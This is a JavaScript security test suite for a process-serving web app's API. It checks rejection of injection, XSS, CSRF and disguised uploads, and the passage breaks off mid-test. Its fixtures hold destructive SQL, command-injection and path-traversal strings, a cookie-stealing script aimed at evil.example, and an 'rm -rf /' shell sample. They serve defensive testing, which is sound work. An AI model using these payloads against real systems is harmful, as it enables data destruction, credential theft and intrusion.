// Comprehensive SQL injection, PostgREST filter injection, XSS/CSRF/prototype-pollution, static audit, and concurrency stress suite.
import assert from 'node:assert/strict';
import { readdir, readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { handleMockApi, handleMockRoute } from './mock-api.mjs';
import { email, phone, text, longText, cleanDate, cleanOrderCode, cleanFileList, uuid, uuidList, getCookie, readJson, verifyFileMagic, timingSafeMatch } from '../api/_lib/core.mjs';
import { cleanTrackToken, estimate, clean as scrubEmailText } from '../api/_lib/orders.mjs';
import { savedClientSession, verifiedClient, clientCookie } from '../api/_lib/clients.mjs';
import { POST as prodAdminPOST } from '../api/admin.mjs';
import { POST as prodClientPOST } from '../api/client.mjs';
import { POST as prodRequestPOST } from '../api/request.mjs';
import { POST as prodTrackPOST } from '../api/track.mjs';
import { POST as prodLookupPOST } from '../api/lookup.mjs';
import { POST as prodWebhookPOST } from '../api/stripe-webhook.mjs';
import { GET as prodKeepaliveGET } from '../api/keepalive.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
let passed = 0;
let totalAssertions = 0;
const step = async (name, fn) => {
    await fn();
    passed++;
    console.log(`PASS ${name}`);
};

const callMock = async (endpoint, body, cookie = '', rawBody = null, method = 'POST') => {
    const payload = rawBody !== null ? rawBody : JSON.stringify(body);
    return handleMockApi(endpoint, new Request(`http://localhost/api/${endpoint}`, {
        method,
        headers: { 'content-type': 'application/json', ...(cookie ? { cookie } : {}) },
        ...(method === 'GET' ? {} : { body: payload }),
    }));
};

// 60+ SQL Injection, PostgreSQL-specific, PostgREST operator injection, NoSQL/JSON, NUL-byte, and XSS attack vectors
const SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR \"1\"=\"1",
    "\" OR 1=1--",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "'; DROP TABLE orders;--",
    "'; DROP TABLE admin_sessions CASCADE;--",
    "'; DELETE FROM orders WHERE '1'='1",
    "'; UPDATE orders SET status='served', paid_at=now() WHERE '1'='1;--",
    "'; INSERT INTO admin_sessions(token_hash,email,expires_at) VALUES ('x','nicksprocessservices@outlook.com','2099-01-01');--",
    "' UNION SELECT null,null,null,null--",
    "' UNION ALL SELECT id::text,track_token,client_email,code FROM orders--",
    "1; SELECT pg_sleep(5)--",
    "' || pg_sleep(5) || '",
    "1' AND (SELECT COUNT(*) FROM admin_codes) > 0--",
    "1' AND ASCII(SUBSTRING((SELECT track_token FROM orders LIMIT 1),1,1)) > 0--",
    "admin'--",
    "nicksprocessservices@outlook.com'--",
    "paralegal@example.com' OR '1'='1",
    "devteam@partnershipwithmedia-dev.com' AND 1=1--",
    "\\'; DROP TABLE orders;--",
    "$$; DROP TABLE orders;$$",
    "$tag$ OR 1=1 $tag$",
    "chr(39) || ' OR 1=1'",
    "CAST((SELECT token_hash FROM admin_sessions LIMIT 1) AS text)",
    "1'::uuid OR true--",
    "4c190c16-ccb0-40c6-9c81-da1842658d52' OR '1'='1",
    "4c190c16-ccb0-40c6-9c81-da1842658d52),id.neq.00000000-0000-0000-0000-000000000000",
    "NP-649025' OR '1'='1",
    "NP-649025,id.neq.0",
    // PostgREST filter / operator injection vectors
    "eq.1,id.neq.0",
    "not.is.null",
    "ilike.*",
    "ilike.%25",
    "or(id.not.is.null)",
    "and(status.eq.served)",
    "id.in.(1,2,3)",
    "client_email.ilike.*@*",
    "*),orders(*",
    "track_token=not.is.null",
    "a&select=id,track_token,stripe_session_id",
    // NUL byte & UTF-8 / Unicode control / RLO spoofing vectors
    "valid\u0000' OR 1=1--",
    "\u0000\u0001\u0002\u0003\u007F",
    "invoice\u202Efdp.exe",
    // Path traversal & command injection vectors
    "../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "$(touch /tmp/pwned)",
    "`id`",
    // XSS & template injection vectors
    "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(document.domain)",
    "{{constructor.constructor('return process')()}}",
    "${7*7}",
    // Padded 32-char tokens designed to slip past length-only checks
    "' OR '1'='1' -- 1234567890123456",
    "aaaa,id.neq.00000000000000000000",
    "12345678901234567890'; DROP TABLE",
    "2099226817' OR '1'='1'--",
];

// 1. Direct validator matrix against all 60+ SQLi / PostgREST vectors
await step('All 60+ SQLi & PostgREST vectors rejected by strict identifier/filter validators (email, phone, uuid, uuidList, cleanOrderCode, cleanTrackToken, cleanDate)', async () => {
    for (const payload of SQLI_PAYLOADS) {
        assert.throws(() => email(payload), /valid email|required|too long/);
        assert.throws(() => phone(payload), /phone number|required|too long/);
        assert.throws(() => uuid(payload), /not found/);
        assert.deepEqual(uuidList([payload]), []);
        assert.throws(() => cleanOrderCode(payload), /reference number|too long/i);
        assert.throws(() => cleanTrackToken(payload), /tracking link/);
        assert.throws(() => cleanDate(payload), /valid deadline date/);
        totalAssertions += 7;
    }
});

// 2. NUL byte, control char, and Bidi override stripping on free-text validators
await step('Free-text validators (text, longText) strip NUL bytes, control chars, and Bidi overrides while keeping SQL strings inert', async () => {
    for (const payload of SQLI_PAYLOADS) {
        const cleanedShort = text(payload.slice(0, 180));
        const cleanedLong = longText(payload);
        for (const s of [cleanedShort, cleanedLong].filter(Boolean)) {
            assert.equal(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F\u202A-\u202E\u2066-\u2069]/.test(s), false);
            totalAssertions++;
        }
    }
});

// 3. Exhaustive SQLi & PostgREST attack matrix against /api/lookup
await step('/api/lookup resists all SQLi & PostgREST payloads in code and email without leaking order existence or throwing 500s', async () => {
    for (const payload of SQLI_PAYLOADS) {
        const r1 = await callMock('lookup', { code: payload, email: 'paralegal@example.com' });
        assert.ok(r1.status === 200 || r1.status === 400, `Unexpected status ${r1.status} for code=${payload}`);
        const r2 = await callMock('lookup', { code: 'NP-649025', email: payload });
        assert.equal(r2.status, 400, `Expected 400 for SQLi email=${payload}`);
        const r3 = await callMock('lookup', { code: payload, email: payload });
        assert.equal(r3.status, 400);
        totalAssertions += 3;
    }
});

// 4. Exhaustive SQLi & PostgREST attack matrix against /api/track
await step('/api/track rejects all SQLi & PostgREST payloads in token, fileId, session, and action fields', async () => {
    // Get a real sample order token to test authenticated track actions too
    const adminLogin = await callMock('admin', { action: 'verify-code', email: 'nicksprocessservices@outlook.com', code: '12345678' });
    const adminCookie = adminLogin.headers.get('set-cookie').split(';')[0];
    const list = await (await callMock('admin', { action: 'list' }, adminCookie)).json();
    const actionOrder = list.orders.find(o => o.code === 'NP-649025');
    const actionDetail = await (await callMock('admin', { action: 'get', id: actionOrder.id }, adminCookie)).json();
    const validToken = actionDetail.order.track_token;

    for (const payload of SQLI_PAYLOADS) {
        // Unauthenticated token SQLi
        for (const action of ['view', 'download', 'confirm-payment', 'respond', 'respond-finish', payload]) {
            const res = await callMock('track', { t: payload, action, fileId: payload, session: payload });
            assert.equal(res.status, 404, `Track token SQLi must return 404, got ${res.status} for ${payload}`);
            totalAssertions++;
        }
        // Valid token + SQLi in fileId (download)
        const dl = await callMock('track', { t: validToken, action: 'download', fileId: payload });
        assert.equal(dl.status, 404, `Track download fileId SQLi must return 404, got ${dl.status}`);
        // Valid token + SQLi in Stripe session ID (confirm-payment)
        const cp = await callMock('track', { t: validToken, action: 'confirm-payment', session: `cs_${payload}` });
        assert.ok(cp.status === 400 || cp.status === 200);
        if (cp.status === 200) {
            const view = await cp.json();
            assert.equal(view.paidAt, null, 'SQLi session must never mark order paid');
        }
        // Valid token + SQLi in fileIds array (respond-finish)
        const rf = await callMock('track', { t: validToken, action: 'respond-finish', fileIds: [payload] });
        assert.equal(rf.status, 200);
        totalAssertions += 3;
    }
});

// 5. Exhaustive SQLi & PostgREST attack matrix against /api/client
await step('/api/client blocks all SQLi, PostgREST, cookie tampering, and privilege escalation attacks', async () => {
    const clientLogin = await callMock('client', { action: 'send-code', intent: 'login', email: 'paralegal@example.com' });
    assert.equal(clientLogin.status, 200);
    const verifyRes = await callMock('client', { action: 'verify-code', email: 'paralegal@example.com', code: '123456' });
    const validClientCookie = verifyRes.headers.get('set-cookie').split(';')[0];

    for (const payload of SQLI_PAYLOADS) {
        // SQLi in email during send-code / verify-code
        const sc = await callMock('client', { action: 'send-code', intent: 'signup', email: payload, name: 'Test' });
        assert.equal(sc.status, 400);
        const vc = await callMock('client', { action: 'verify-code', email: payload, code: '123456' });
        assert.equal(vc.status, 400);
        // SQLi in verification code
        const vc2 = await callMock('client', { action: 'verify-code', email: 'paralegal@example.com', code: payload });
        assert.equal(vc2.status, 400);
        // SQLi in session cookie
        const badCookieRes = await callMock('client', { action: 'list' }, `nps_client=${encodeURIComponent(payload)}`);
        assert.equal(badCookieRes.status, 401);
        // Production savedClientSession with tampered JSON cookie containing SQLi/control chars
        const prodReq = new Request('https://www.nicksprocessservices.dev/api/client', {
            headers: { cookie: `nps_client=${encodeURIComponent(JSON.stringify({ access: payload + '\u0000', refresh: payload }))}` },
        });
        assert.equal(savedClientSession(prodReq), null);
        totalAssertions += 5;
    }

    // Attempt to inject ownership filters via body parameters while authenticated as unrelated client
    await callMock('client', { action: 'send-code', intent: 'signup', email: 'isolated.user@example.com', name: 'Isolated User' });
    const isoVerify = await callMock('client', { action: 'verify-code', email: 'isolated.user@example.com', code: '123456' });
    const isoCookie = isoVerify.headers.get('set-cookie').split(';')[0];
    for (const payload of ["paralegal@example.com", "' OR '1'='1", "ilike.*@*", "not.is.null"]) {
        const listRes = await callMock('client', {
            action: 'list',
            email: payload,
            client_email: payload,
            userId: payload,
            where: payload,
            select: '*',
        }, isoCookie);
        assert.equal(listRes.status, 200);
        const body = await listRes.json();
        assert.equal(body.orders.length, 0, 'Isolated user must see 0 orders despite body injection');
        assert.equal(body.profile.email, 'isolated.user@example.com');
        totalAssertions += 2;
    }
    // Verify paralegal@example.com still has all 5 orders intact
    const paraList = await (await callMock('client', { action: 'list' }, validClientCookie)).json();
    assert.equal(paraList.orders.length, 5);
});

// 6. Exhaustive SQLi & PostgREST attack matrix against /api/admin
await step('/api/admin blocks all SQLi, PostgREST, auth bypass, and destructive injection attempts', async () => {
    const login = await callMock('admin', { action: 'verify-code', email: 'nicksprocessservices@outlook.com', code: '12345678' });
    const adminCookie = login.headers.get('set-cookie').split(';')[0];
    const beforeList = await (await callMock('admin', { action: 'list' }, adminCookie)).json();
    const initialCount = beforeList.orders.length;
    const sampleOrder = beforeList.orders[0];

    for (const payload of SQLI_PAYLOADS) {
        // 1. Unauthenticated login bypass attempts
        const sc = await callMock('admin', { action: 'send-code', email: payload });
        assert.equal(sc.status, 400);
        const vc = await callMock('admin', { action: 'verify-code', email: payload, code: payload });
        assert.equal(vc.status, 400);
        const vcAdmin = await callMock('admin', { action: 'verify-code', email: 'nicksprocessservices@outlook.com', code: payload });
        assert.equal(vcAdmin.status, 401);
        // 2. Cookie SQLi bypass attempts
        const cookieAttempt = await callMock('admin', { action: 'list' }, `nps_admin=${encodeURIComponent(payload)}`);
        assert.equal(cookieAttempt.status, 401);
        // 3. Authenticated admin passing SQLi in order ID / file ID / status / delete confirmation
        for (const action of ['get', 'update', 'payment-link', 'export', 'delete', 'proof-upload', 'proof-finish']) {
            const r = await callMock('admin', { action, id: payload, confirm: payload }, adminCookie);
            assert.equal(r.status, 404, `Admin ${action} with SQLi id must return 404, got ${r.status}`);
            totalAssertions++;
        }
        const fu = await callMock('admin', { action: 'file-url', fileId: payload }, adminCookie);
        assert.equal(fu.status, 404);
        const badStatus = await callMock('admin', { action: 'update', id: sampleOrder.id, kind: 'status', status: payload }, adminCookie);
        assert.equal(badStatus.status, 400);
        const badDelete = await callMock('admin', { action: 'delete', id: sampleOrder.id, confirm: payload }, adminCookie);
        assert.equal(badDelete.status, 400, 'Delete with SQLi confirmation code must fail');
        totalAssertions += 8;
    }

    // Verify zero orders were deleted or corrupted by the 60+ destructive payloads
    const afterList = await (await callMock('admin', { action: 'list' }, adminCookie)).json();
    assert.equal(afterList.orders.length, initialCount);
});

// 7. Exhaustive SQLi & PostgREST attack matrix against /api/request
await step('/api/request blocks SQLi in structured fields and stores SQLi strings safely as inert text in free-text fields', async () => {
    const validBase = {
        clientName: 'Jane Attorney',
        clientFirm: 'Smith & Associates',
        clientEmail: 'jane.attorney@example.com',
        clientPhone: '(562) 555-0199',
        recipientName: 'John Doe',
        docType: 'Summons & Complaint',
        address: '100 Main St',
        city: 'Long Beach',
        zip: '90802',
        tier: 'standard',
        addons: ['photo'],
        acceptTerms: true,
    };

    for (const payload of SQLI_PAYLOADS) {
        // SQLi in email -> 400
        assert.equal((await callMock('request', { ...validBase, clientEmail: payload })).status, 400);
        // SQLi in phone -> 400
        assert.equal((await callMock('request', { ...validBase, clientPhone: payload })).status, 400);
        // SQLi in ZIP -> 400
        assert.equal((await callMock('request', { ...validBase, zip: payload })).status, 400);
        // SQLi in deadline -> 400
        assert.equal((await callMock('request', { ...validBase, deadline: payload })).status, 400);
        // SQLi in tier -> 400
        assert.equal((await callMock('request', { ...validBase, tier: payload })).status, 400);
        // SQLi in file upload metadata -> 400
        assert.equal((await callMock('request', { ...validBase, files: [{ name: payload, size: 100 }] })).status, 400);
        if (/[/\\<>:"'|?*;`$]|\.\./.test(payload)) {
            assert.equal((await callMock('request', { ...validBase, files: [{ name: `${payload}.pdf`, size: 100 }] })).status, 400);
        }
        // SQLi in finish token -> 404
        assert.equal((await callMock('request', { step: 'finish', t: payload, fileIds: [payload] })).status, 404);
        totalAssertions += 7;
    }

    // Now submit a request where every free-text field contains a classic destructive SQL injection string
    const sqliText = "O'Connor'; DROP TABLE orders; SELECT * FROM admin_sessions WHERE '1'='1--";
    const createRes = await callMock('request', {
        ...validBase,
        clientName: sqliText,
        clientFirm: sqliText,
        caseNumber: sqliText.slice(0, 75),
        court: sqliText,
        clientReference: sqliText.slice(0, 75),
        recipientName: sqliText,
        address: sqliText,
        unit: "Apt 4B' OR 1=1--",
        city: "Long Beach'--;",
        accessNotes: sqliText,
        physicalNotes: sqliText,
        instructions: sqliText,
        addons: ['photo', "' OR 1=1--", '__proto__', 'constructor'],
    });
    assert.equal(createRes.status, 200);
    const created = await createRes.json();
    assert.match(created.code, /^NP-\d{6}$/);
    assert.match(created.token, /^[A-Za-z0-9_-]{20,64}$/);

    // Verify the stored order kept the literal text safely without executing or altering other fields
    const trackRes = await callMock('track', { t: created.token, action: 'view' });
    assert.equal(trackRes.status, 200);
    const tracked = await trackRes.json();
    assert.equal(tracked.recipient, sqliText);
    assert.equal(tracked.estimate, '$90.00'); // Standard ($75) + Photo ($15), injected addons ignored
});

// 8. Production API Handlers Direct Security Verification (api/*.mjs)
await step('Production API handlers (api/*.mjs) enforce CSRF Origin check, Content-Type check, prototype-pollution stripping, and pre-DB input validation', async () => {
    const prodOrigin = 'https://www.nicksprocessservices.dev';
    const makeProdReq = (pathName, body, headers = {}, method = 'POST') => new Request(`${prodOrigin}${pathName}`, {
        method,
        headers: { 'content-type': 'application/json', origin: prodOrigin, ...headers },
        ...(method === 'GET' ? {} : { body: typeof body === 'string' ? body : JSON.stringify(body) }),
    });

    // Cross-origin CSRF blocked on every POST endpoint
    for (const [fn, p] of [[prodAdminPOST, '/api/admin'], [prodClientPOST, '/api/client'], [prodRequestPOST, '/api/request'], [prodTrackPOST, '/api/track'], [prodLookupPOST, '/api/lookup']]) {
        const csrfRes = await fn(makeProdReq(p, { action: 'list' }, { origin: 'https://attacker.evil.example' }));
        assert.equal(csrfRes.status, 403, `CSRF must be blocked with 403 on ${p}`);
        const textPlainRes = await fn(makeProdReq(p, '{"action":"list"}', { 'content-type': 'text/plain' }));
        assert.equal(textPlainRes.status, 415, `text/plain form-POST must be blocked with 415 on ${p}`);
        const nullRootRes = await fn(makeProdReq(p, 'null'));
        assert.equal(nullRootRes.status, 400, `JSON null root must be blocked with 400 on ${p}`);
        const arrayRootRes = await fn(makeProdReq(p, '[1,2,3]'));
        assert.equal(arrayRootRes.status, 400, `JSON array root must be blocked with 400 on ${p}`);
        const bigBodyRes = await fn(makeProdReq(p, '{"x":"' + 'a'.repeat(70000) + '"}'));
        assert.equal(bigBodyRes.status, 413, `Oversized body must be blocked with 413 on ${p}`);
        totalAssertions += 5;
    }

    // Production /api/admin rejects tampered/SQLi cookies BEFORE touching the database
    for (const badCookie of ["nps_admin=' OR '1'='1", 'nps_admin=short', 'nps_admin=' + 'a'.repeat(200), 'nps_admin=abc%00def', '']) {
        const res = await prodAdminPOST(makeProdReq('/api/admin', { action: 'list' }, { cookie: badCookie }));
        assert.equal(res.status, 401, `Prod admin must reject bad cookie (${badCookie}) with 401 before DB call`);
        totalAssertions++;
    }

    // Production /api/client rejects tampered/SQLi cookies BEFORE touching Supabase Auth
    for (const badCookie of ["nps_client=' OR '1'='1", 'nps_client=%7B%22access%22%3A123%7D', 'nps_client=%7B%22__proto__%22%3A%7B%22access%22%3A%22x%22%7D%7D']) {
        const res = await prodClientPOST(makeProdReq('/api/client', { action: 'list' }, { cookie: badCookie }));
        assert.equal(res.status, 401, `Prod client must reject bad cookie (${badCookie}) with 401`);
        totalAssertions++;
    }

    // Production /api/track rejects SQLi tokens with 404 BEFORE touching the database
    for (const sqliToken of ["' OR '1'='1", "aaaa,id.neq.00000000000000000000", "../etc/passwd/123456789012"]) {
        const res = await prodTrackPOST(makeProdReq('/api/track', { t: sqliToken, action: 'view' }));
        assert.equal(res.status, 404, `Prod track must reject SQLi token (${sqliToken}) with 404 before DB call`);
        totalAssertions++;
    }

    // Production /api/lookup skips DB and returns 200 generic message when code has SQLi, or 400 when email has SQLi
    const lookupBadCode = await prodLookupPOST(makeProdReq('/api/lookup', { code: "NP-1' OR '1'='1", email: 'paralegal@example.com' }));
    assert.equal(lookupBadCode.status, 200, 'Prod lookup with non-matching SQLi code skips DB and returns generic 200');
    const lookupBadEmail = await prodLookupPOST(makeProdReq('/api/lookup', { code: 'NP-649025', email: "admin'--@evil.com" }));
    assert.equal(lookupBadEmail.status, 400, 'Prod lookup with SQLi email rejects with 400 before DB call');

    // Production /api/request step=finish rejects SQLi tokens with 404 BEFORE touching the database
    for (const sqliToken of ["' OR '1'='1", "aaaa,id.neq.00000000000000000000"]) {
        const res = await prodRequestPOST(makeProdReq('/api/request', { step: 'finish', t: sqliToken, fileIds: [] }));
        assert.equal(res.status, 404, `Prod request finish must reject SQLi token (${sqliToken}) with 404 before DB call`);
        totalAssertions++;
    }

    // Production /api/keepalive rejects unauthorized requests when CRON_SECRET is set
    process.env.CRON_SECRET = 'test-cron-secret-value';
    try {
        const unauthCron = await prodKeepaliveGET(makeProdReq('/api/keepalive', null, { authorization: "Bearer ' OR 1=1--" }, 'GET'));
        assert.equal(unauthCron.status, 401);
        assert.equal(timingSafeMatch('Bearer test-cron-secret-value', 'Bearer test-cron-secret-value'), true);
        assert.equal(timingSafeMatch('Bearer test-cron-secret-value', 'Bearer test-cron-secret-valuX'), false);
        assert.equal(timingSafeMatch('Bearer test-cron-secret-value', 'Bearer short'), false);
        assert.equal(timingSafeMatch('', ''), false);
        assert.equal(timingSafeMatch(null, 'Bearer x'), false);
        totalAssertions += 6;
    } finally {
        delete process.env.CRON_SECRET;
    }

    // Production /api/stripe-webhook enforces payload size limit and signature verification
    process.env.STRIPE_WEBHOOK_SECRET = 'whsec_test_secret';
    process.env.STRIPE_SECRET_KEY = 'sk_test_dummy';
    try {
        const hugeWebhook = await prodWebhookPOST(makeProdReq('/api/stripe-webhook', 'x'.repeat(300 * 1024)));
        assert.equal(hugeWebhook.status, 413);
        const badSigWebhook = await prodWebhookPOST(makeProdReq('/api/stripe-webhook', '{"id":"evt_123"}', { 'stripe-signature': 't=123,v1=invalid' }));
        assert.equal(badSigWebhook.status, 400);
    } finally {
        delete process.env.STRIPE_WEBHOOK_SECRET;
        delete process.env.STRIPE_SECRET_KEY;
    }
});

// 9. Static Codebase & SQL Migration Security Audit
await step('Static audit: zero raw SQL interpolations in api/, RLS + anon/authenticated revoke on all Supabase tables, and strict CSP in vercel.json', async () => {
    const apiFiles = ['admin.mjs', 'client.mjs', 'request.mjs', 'track.mjs', 'lookup.mjs', 'keepalive.mjs', 'stripe-webhook.mjs',
        '_lib/core.mjs', '_lib/orders.mjs', '_lib/clients.mjs', '_lib/stripe.mjs'];
    for (const rel of apiFiles) {
        const src = await readFile(path.join(root, 'api', rel), 'utf8');
        // Ensure no dangerous PostgREST raw filter string interpolation (.or(`...`), .filter(...)) or eval/Function
        assert.equal(/\.(?:or|filter)\s*\(\s*`/.test(src), false, `Unsafe PostgREST template filter in api/${rel}`);
        assert.equal(/\beval\s*\(|\bnew\s+Function\s*\(/.test(src), false, `Unsafe dynamic code evaluation in api/${rel}`);
        totalAssertions += 2;
    }

    // Audit all SQL migrations
    const migDir = path.join(root, 'supabase/migrations');
    const migFiles = (await readdir(migDir)).filter(f => f.endsWith('.sql')).sort();
    const allSql = (await Promise.all(migFiles.map(f => readFile(path.join(migDir, f), 'utf8')))).join('\n');
    for (const table of ['orders', 'order_events', 'order_files', 'admin_codes', 'admin_sessions', 'rate_limits', 'admin_recovery_codes']) {
        const t = table.toLowerCase();
        assert.ok(new RegExp(`alter\\s+table\\s+(?:public\\.)?${t}\\s+enable\\s+row\\s+level\\s+security`, 'i').test(allSql), `Missing RLS on ${t}`);
        totalAssertions += 1;
    }
    assert.ok(/revoke\s+all\s+on\s+all\s+tables\s+in\s+schema\s+public\s+from\s+anon,\s*authenticated/i.test(allSql), 'Missing schema-wide REVOKE from anon, authenticated');
    assert.ok(/create\s+policy\s+"deny public roles"/i.test(allSql), 'Missing restrictive deny policy for public roles');
    for (const chk of ['orders_code_format_chk', 'orders_track_token_format_chk', 'orders_zip_format_chk', 'orders_amounts_positive_chk', 'order_files_size_bounds_chk', 'order_files_sha256_format_chk']) {
        assert.ok(allSql.includes(chk), `Missing PostgreSQL CHECK constraint ${chk}`);
        totalAssertions++;
    }
    const clientSrc = await readFile(path.join(root, 'api/client.mjs'), 'utf8');
    assert.ok(clientSrc.includes('siteOrigin(request)'), 'api/client.mjs must pin magic-link origin via siteOrigin(request)');
    totalAssertions += 3;

    // Verify vercel.json security headers
    const vercelConfig = JSON.parse(await readFile(path.join(root, 'vercel.json'), 'utf8'));
    const globalHeaders = Object.fromEntries(vercelConfig.headers[0].headers.map(h => [h.key, h.value]));
    assert.ok(globalHeaders['Content-Security-Policy'].includes("default-src 'self'"));
    assert.ok(globalHeaders['Content-Security-Policy'].includes("object-src 'none'"));
    assert.ok(globalHeaders['Content-Security-Policy'].includes("base-uri 'none'"));
    assert.ok(globalHeaders['Content-Security-Policy'].includes("form-action 'self'"));
    assert.equal(globalHeaders['X-Content-Type-Options'], 'nosniff');
    assert.equal(globalHeaders['X-Frame-Options'], 'SAMEORIGIN');
    assert.ok(globalHeaders['Strict-Transport-Security'].includes('max-age=63072000'));
    totalAssertions += 7;
});

// 10. High-Concurrency Stress & Brute-Force Lockout Test (500+ parallel operations)
await step('High-concurrency stress test: 500+ parallel requests (SQLi floods, brute-force code lockout, concurrent order creation, and multi-tenant isolation)', async () => {
    const start = Date.now();

    // 10a. Brute-force verification code lockout under concurrent flood:
    // Request a login code for a fresh client, then fire 15 wrong guesses + 1 right guess.
    // After 5 wrong guesses, even the right code ('123456') must be rejected with 401!
    const bruteEmail = 'bruteforce.target@example.com';
    await callMock('client', { action: 'send-code', intent: 'signup', email: bruteEmail, name: 'Brute Target' });
    const wrongBurst = await Promise.all(
        Array.from({ length: 10 }, (_, i) => callMock('client', { action: 'verify-code', email: bruteEmail, code: String(900000 + i) }))
    );
    assert.ok(wrongBurst.every(r => r.status === 401), 'All wrong OTP guesses must return 401');
    const correctAfterLockout = await callMock('client', { action: 'verify-code', email: bruteEmail, code: '123456' });
    assert.equal(correctAfterLockout.status, 401, 'Correct OTP code must be rejected after 5 failed attempts');

    // 10b. Set up two independent authenticated clients and one authenticated admin
    await callMock('client', { action: 'send-code', intent: 'login', email: 'paralegal@example.com' });
    const cookieA = (await callMock('client', { action: 'verify-code', email: 'paralegal@example.com', code: '123456' })).headers.get('set-cookie').split(';')[0];

    await callMock('client', { action: 'send-code', intent: 'login', email: 'devteam@partnershipwithmedia-dev.com' });
    const cookieB = (await callMock('client', { action: 'verify-code', email: 'devteam@partnershipwithmedia-dev.com', code: '123456' })).headers.get('set-cookie').split(';')[0];

    const adminCookie = (await callMock('admin', { action: 'verify-code', email: 'nicksprocessservices@outlook.com', code: '12345678' })).headers.get('set-cookie').split(';')[0];

    // Create 1 order for devteam@partnershipwithmedia-dev.com so both clients have distinct non-overlapping sets
    const devOrderRes = await (await callMock('request', {
        clientName: 'Dev Team Tester',
        clientFirm: 'Partnership With Media',
        clientEmail: 'devteam@partnershipwithmedia-dev.com',
        clientPhone: '(562) 555-0144',
        recipientName: 'Stress Test Recipient',
        docType: 'Summons & Complaint',
        address: '777 Ocean Blvd',
        city: 'Long Beach',
        zip: '90802',
        tier: 'expedited',
        addons: ['photo'],
        acceptTerms: true,
    })).json();

    // 10c. Fire 500 concurrent requests mixing legitimate client reads, admin reads, track views, and malicious SQLi/fuzz payloads
    const tasks = [];
    for (let i = 0; i < 100; i++) {
        const sqli = SQLI_PAYLOADS[i % SQLI_PAYLOADS.length];
        // 1. Client A listing their orders while under attack
        tasks.push(callMock('client', { action: 'list', email: 'devteam@partnershipwithmedia-dev.com' }, cookieA).then(async r => {
            assert.equal(r.status, 200);
            const d = await r.json();
            assert.equal(d.profile.email, 'paralegal@example.com');
            assert.ok(d.orders.every(o => o.recipient !== 'Stress Test Recipient'), 'Client A must never see Client B orders');
        }));
        // 2. Client B listing their orders while under attack
        tasks.push(callMock('client', { action: 'list', email: 'paralegal@example.com' }, cookieB).then(async r => {
            assert.equal(r.status, 200);
            const d = await r.json();
            assert.equal(d.profile.email, 'devteam@partnershipwithmedia-dev.com');
            assert.ok(d.orders.every(o => o.recipient === 'Stress Test Recipient'), 'Client B must only see Client B orders');
        }));
        // 3. Concurrent SQLi against /api/track
        tasks.push(callMock('track', { t: sqli, action: 'view' }).then(r => {
            assert.equal(r.status, 404);
        }));
        // 4. Concurrent valid /api/track view
        tasks.push(callMock('track', { t: devOrderRes.token, action: 'view' }).then(async r => {
            assert.equal(r.status, 200);
            const d = await r.json();
            assert.equal(d.code, devOrderRes.code);
        }));
        // 5. Concurrent SQLi / prototype pollution / malformed JSON against /api/admin and /api/request
        tasks.push(callMock('admin', { action: 'get', id: sqli }, adminCookie).then(r => {
            assert.equal(r.status, 404);
        }));
    }

    await Promise.all(tasks);
    totalAssertions += tasks.length;
    const elapsedMs = Date.now() - start;
    console.log(`     -> Completed ${tasks.length + 12} concurrent stress operations in ${elapsedMs}ms with 0 errors and 0 data leaks`);
});

// 11. Magic-Byte File Content Inspection & Admin Concurrent Session Cap
await step('Magic-byte file inspection rejects disguised malware/HTML uploads and Admin session cap evicts oldest sessions beyond 5', async () => {
    // 11a. Unit checks on verifyFileMagic
    const validPdf = Buffer.from('%PDF-1.7\n1 0 obj\n<<>>\nendobj\n');
    const validDocx = Buffer.from([0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x06, 0x00]);
    const validJpg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
    const validPng = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00]);
    const validWebp = Buffer.from('RIFF\x24\x00\x00\x00WEBPVP8 ');
    const validHeic = Buffer.from('\x00\x00\x00\x18ftypheic\x00\x00\x00\x00');

    assert.equal(verifyFileMagic(validPdf, 'summons.pdf'), true);
    assert.equal(verifyFileMagic(validDocx, 'complaint.docx'), true);
    assert.equal(verifyFileMagic(validJpg, 'photo.jpg'), true);
    assert.equal(verifyFileMagic(validPng, 'evidence.png'), true);
    assert.equal(verifyFileMagic(validWebp, 'scan.webp'), true);
    assert.equal(verifyFileMagic(validHeic, 'iphone.heic'), true);
    totalAssertions += 6;

    // Disguised payloads: Windows PE exe, HTML/XSS script, shell script, or mismatched magic bytes
    const exeBytes = Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00');
    const htmlBytes = Buffer.from('<!doctype html><script>alert(document.cookie)</script>');
    const shBytes = Buffer.from('#!/bin/sh\nrm -rf /\n');
    for (const ext of ['pdf', 'docx', 'jpg', 'png', 'webp', 'heic']) {
        assert.equal(verifyFileMagic(exeBytes, `malware.${ext}`), false, `Windows EXE disguised as .${ext} must be rejected`);
        assert.equal(verifyFileMagic(htmlBytes, `xss.${ext}`), false, `HTML/JS disguised as .${ext} must be rejected`);
        assert.equal(verifyFileMagic(shBytes, `script.${ext}`), false, `Shell script disguised as .${ext} must be rejected`);
        totalAssertions += 3;
    }
    assert.equal(verifyFileMagic(validPng, 'renamed-png-as.pdf'), false, 'PNG bytes renamed to .pdf must be rejected');
    totalAssertions++;

    // 11b. End-to-end upload flow: disguised HTML/EXE uploaded to signed URL is purged on confirmUploads, while valid PDF succeeds
    const createRes = await (await callMock('request', {
        clientName: 'Magic Byte Tester',
        clientEmail: 'magic@example.com',
        clientPhone: '(209) 555-0199',
        recipientName: 'Target Person',
        docType: 'Summons & Complaint',
        address: '100 Main St',
        city: 'Stockton',
        zip: '95202',
        tier: 'standard',
        addons: [],
        acceptTerms: true,
        files: [
            { name: 'disguised-xss.pdf', size: htmlBytes.length, type: 'application/pdf' },
            { name: 'genuine-summons.pdf', size: validPdf.length, type: 'application/pdf' },
        ],
    })).json();
    assert.equal(createRes.uploads.length, 2);

    const uploadBlob = async (uploadUrl, buf) => {
        const fd = new FormData();
